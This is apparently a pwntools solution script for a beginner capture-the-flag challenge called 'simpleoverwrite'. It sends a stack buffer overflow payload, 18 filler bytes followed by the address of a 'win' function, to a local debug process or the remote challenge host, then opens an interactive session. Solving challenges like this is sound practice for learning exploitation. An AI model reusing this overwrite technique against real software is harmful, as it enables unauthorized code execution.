from pwn import *
elf_file = FILENAME = './chall'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log



HOST = 'simpleoverwrite.beginners.seccon.games'
POST = 9001
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  c = remote(HOST, POST)
else:
  #c = process(FILENAME)
  c = gdb.debug(FILENAME,gdbscript='''b main''')

win = 0x401186
buf = 18
payload = b'a'*buf
payload += p64(win)
c.sendline(payload)
c.interactive()